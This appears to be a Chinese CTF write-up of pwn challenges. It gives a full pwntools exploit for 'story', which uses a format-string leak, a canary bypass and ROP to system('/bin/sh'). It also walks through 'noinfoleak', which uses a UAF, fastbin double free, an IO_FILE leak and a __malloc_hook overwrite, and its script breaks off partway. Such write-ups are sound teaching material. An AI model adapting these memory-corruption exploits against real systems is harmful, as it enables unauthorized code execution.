## 前言：
写一下西湖论剑里的三道pwn题，主要讲一下第二道，因为后面我才发现自己解第二道好像是非预期解。。讲一下自己的解题思路吧。
## Story：
常规基础pwn，格式化字符串+ROP。
### 漏洞：
格式化字符串：
    printf(&s);
栈溢出：
    if ( v1  128 )
        v1 = 1024LL;
      puts("You can speak your story:");
      rread((__int64)&s, v1);
### 思路：
  1. 格式化字符串先泄漏`canary`的值和`__libc_start_main`的值，得到libc
  2. 找ROP_gadget
  3. 栈溢出，覆盖到ROP，返回`system`
### EXP：
    from pwn import *
    #p = process('./story')
    p = remote('ctf3.linkedbyx.com',11045)
    elf = ELF('./story')
    libc = ELF('./libc.so')
    p.recvuntil('Please Tell Your ID:')
    p.sendline('%15$p,%25$p')
    p.recvuntil('Hello ')
    data1 = p.recv(18)
    p.recvuntil(',')
    data2 = p.recv(14)
    data1 = int(data1,16)
    data2 = int(data2,16) - 240
    print hex(data1),hex(data2)
    libc_base = data2 - libc.symbols['__libc_start_main']
    system_addr = libc_base + libc.symbols['system']
    bin_addr = libc_base + libc.search('/bin/sh').next()
    p.recvuntil('Tell me the size of your story:')
    p.sendline('144')
    p.recvuntil('You can speak your story:')
    #gdb.attach(p)
    payload = 'A'*136 + p64(data1) + 'A'*8 + p64(0x0000000000400bd3) + p64(bin_addr) + p64(system_addr)
    p.sendline(payload)
    p.interactive()
## noinfoleak：
一看程序就是没有view函数，需要自己想办法leak。因为不久之前刚练手了IO_FILE泄漏的缘故，所以第一时间想到的泄漏就是利用IO_FILE（所以搞的我头皮发麻
只有一个UAF的漏洞，但是足够了。malloc的最大size是0x7f，但是因为程序malloc时候自动加1的缘故，所以最大能拿到0x90的chunk。
### 漏洞点：
UAF：
    free(qword_6010A0[2 * v0]);                 // UAF
### 思路：
  1. Fast bin attack到IO_FILE处
  2. 修改IO_write_base泄漏地址
  3. Fast bin attack到`__malloc_hook`处
  4. malloc触发getshell
### 实践：
Fast bin attack大家都会我这里就不多说了，我这里比较蠢，还用了Double
Free的方式来攻击，导致浪费了chunk，这里其实可以free掉之后修改fd来继续分配fake chunk。
因为我要分配到IO_FILE中，且它在libc中，所以我需要找一个接近于他的一个地址，那么最好的方法就是free掉chunk后的fd和bk指针了。
我先malloc一个0x7f的chunk，然后free。
再malloc 0x60大小，字节内容就填个`A`，防止破坏fd指针。
    pwndbg> heap
    0xdfd000 FASTBIN {
      prev_size = 0x0,
      size = 0x71,
      fd = 0x7f1ef5c6cb41,
      bk = 0x7f1ef5c6cbf8,
      fd_nextsize = 0x4141414141414141,
      bk_nextsize = 0x4141414141414141,
    }
    0xdfd070 FASTBIN {
      prev_size = 0x0,
      size = 0x21,
      fd = 0x7f1ef5c6cb78,
      bk = 0x7f1ef5c6cb78,
      fd_nextsize = 0x20,
      bk_nextsize = 0x70,
    }
而后我们就可以愉快的fast bin attack了，先malloc两个0x60的chunk，而后都free，形成double free，此时的fast
bin：
    pwndbg> bins 
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x104f100 —▸ 0x104f090 ◂— 0x104f100
    0x80: 0x0
两个chunk的情况：
    pwndbg> x/10xg 0x104f100
    0x104f100:  0x0000000000000000  0x0000000000000071
    0x104f110:  0x000000000104f090  0x0000000000000000
    0x104f120:  0x0000000000000000  0x0000000000000000
    0x104f130:  0x0000000000000000  0x0000000000000000
    0x104f140:  0x0000000000000000  0x0000000000000000
    pwndbg> x/10xg 0x104f090
    0x104f090:  0x0000000000000020  0x0000000000000070
    0x104f0a0:  0x000000000104f100  0x4141414141414141
    0x104f0b0:  0x4141414141414141  0x4141414141414141
    0x104f0c0:  0x0000000000000000  0x0000000000000000
    0x104f0d0:  0x0000000000000000  0x0000000000000000
修改`0x104f100`的fd指向`0x104f000`，只需覆盖掉一个字节为`\x00`即可，再malloc两次即可指向最开始所构造的有`main_area`的chunk，在此之前还得修改一下这个chunk的头两个字节为IO_FILE处的地址。
此时我们往IO_FILE看看哪里可以构造chunk：
可以看到我们需要往`0x7f7bd8d375dd`地址去fast bin
attack，而与前面我们所有的`main_area`的fd指针chunk只差了后面两个字节，况且`5dd`还是固定值，所以我们有`1/16`的机会成功，这就是爆破IO_FILE了。所以我们修改一下该chunk：
    edit(3,'\xdd\x45')
再次malloc，即可在IO_FILE地址处的得到一个chunk。这样我们就可以开始愉快的修改IO_write_base来泄漏了。不过还得修改一下flag的魔数，即`0xfbad2883`的值。
我这里选择泄漏了错位的地址，其实可以选择泄漏got表上的地址，泄漏函数地址来达到拿到libc的效果，都一样。
    payload = 'A'*0x33 + p64(0xfbad1800) + p64(0x7f734fa446a3)*3
    payload += '\x50'
    create(0x65,payload)
后面就是常规操作了，fast bin到`malloc_hook`地址即可。这里就不多说了。（exp每家循环，写的不太好。
### EXP：
    from pwn import *
    p = process('./noinfoleak')
    #p = remote('ctf1.linkedbyx.com',10476)
    elf = ELF('./noinfoleak')
    libc = ELF('./libc6.so')
    context.log_level = 'debug'
    def create(size,content):
        p.sendlineafter('>','1')
        p.sendlineafter('>',str(size))
        p.sendafter('>',content)
    def delete(index):
        p.sendlineafter('>','2')
        p.sendlineafter('>',str(index))
    def edit(index,content):
        p.sendlineafter('>','3')
        p.sendlineafter('>',str(index))
        p.sendafter('>',content)
    create(0x7f,'A'*0x20) #0
    create(0x60,'A'*0x20) #1
    create(0x60,'A')      #2
    delete(0)
    create(0x60,'A')      #3
    delete(2)
    delete(1)
    delete(2)
    gdb.attach(p)
    create(0x60,'\x00')#4
    create(0x60,'A')#5